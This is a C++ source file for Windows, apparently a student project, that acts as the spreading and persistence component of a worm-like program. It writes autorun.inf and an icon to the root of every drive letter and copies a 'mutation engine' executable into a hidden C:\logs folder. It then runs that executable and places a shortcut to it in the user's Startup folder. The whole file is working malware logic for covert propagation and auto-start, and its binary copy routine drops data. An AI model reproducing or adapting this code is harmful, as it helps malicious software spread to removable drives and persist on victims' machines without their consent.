#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

/*
 * copyfiles.cpp
 * 
 * Copies files relevant to the program to all drives in computer. All removable 
 * drives receive all program files, whereas the Startup folder in the computer 
 * receives only the XtoM program.
 *
 * Written by Nicholas Allen
 * allen.2020@osu.edu
 */

int copyTextFile(char *src, char *dest);
int copyBinaryFile(char *src, char *dest);
int deleteFile(char *file);

size_t len = 0;
char buffer[BUFSIZ] = { '\0' };

int main(void) 
{
	size_t len = 0;
	
	const int numTextFiles = 1;
	char *textfilenames[numTextFiles] = { "autorun.inf" };
	
	const int numBinaryFiles = 1;
	char *binaryfilenames[numBinaryFiles] = { "driveicon.ico" };
	
	const int numDrives = 24;
	char *destdrives[numDrives] = {"A:\\", "B:\\","E:\\",
								"F:\\", "G:\\", "H:\\", "I:\\", "J:\\",
								"K:\\", "L:\\", "M:\\", "N:\\", "O:\\",
								"P:\\", "Q:\\", "R:\\", "S:\\", "T:\\",
								"U:\\", "V:\\", "W:\\", "X:\\", "Y:\\",
								"Z:\\"
	};
	char buffer[BUFSIZ] = { '\0' };
	
	// Copy files to all drives
	
	char src[200];
	char dest[200];
	
	for(int drive = 0; drive < numDrives; drive++)
	{
		//Text files
		for (int i = 0; i < numTextFiles; i++)
		{
			strcpy(src, textfilenames[i]);
			strcpy(dest, destdrives[drive]);
			strcat(dest, textfilenames[i]);
			
			deleteFile(dest);
			copyTextFile(src, dest);
		}
		
		//Binary files
		for (int i = 0; i < numBinaryFiles; i++)
		{
			strcpy(src, binaryfilenames[i]);
			strcpy(dest, destdrives[drive]);
			strcat(dest, binaryfilenames[i]);
			
			deleteFile(dest);
			copyBinaryFile(src, dest);
		}
	}
	
	//Move mutation engine to somewhat-hidden directory
	strcpy(src, "xichigan.exe");
	strcpy(dest, "C:\\logs");
	
	if(CreateDirectory(dest, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
	{
		strcat(dest, "\\xichigan.exe");
		copyBinaryFile(src, dest);
	}
	else
	{
	}
	
	//Start mutation engine
	system(dest);
	
	//Move shortcut to mutation engine to startup folder
	strcpy(src, "short.lnk");
	strcpy(dest, getenv("USERPROFILE"));
	strcat(dest, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\short.lnk");
	
	copyBinaryFile(src, dest);
	
	return 0;
}

int copyTextFile(char *src, char *dest) 
{
	ifstream infile(src);
	ofstream outfile(dest);
	string text = "";
	int i;
	
	for (i = 0; infile.eof() != true; i++)
	{
		text += infile.get();
	}
	
	i--;
	text.erase(text.end() - 1);
	
	outfile << text.c_str();
	infile.close();
	outfile.close();
	return 0;
}

int copyBinaryFile(char *src, char *dest)
{
	FILE *in = fopen(src, "rb");
	FILE *out = fopen(dest, "wb");
	
	if(in == NULL || out == NULL) {
		in = out = 0;
	}
	else
	{
		while((len = fread(buffer, BUFSIZ, 1, in)) > 0)
		{
			fwrite(buffer, BUFSIZ, 1, out);
		}
		
		
		fclose(in);
		fclose(out);
	}
	
	return 0;
}

int deleteFile(char *file)
{
	if(remove(file))
	{
		return 1;
	}
	else
	{
		return 0;
	}
}
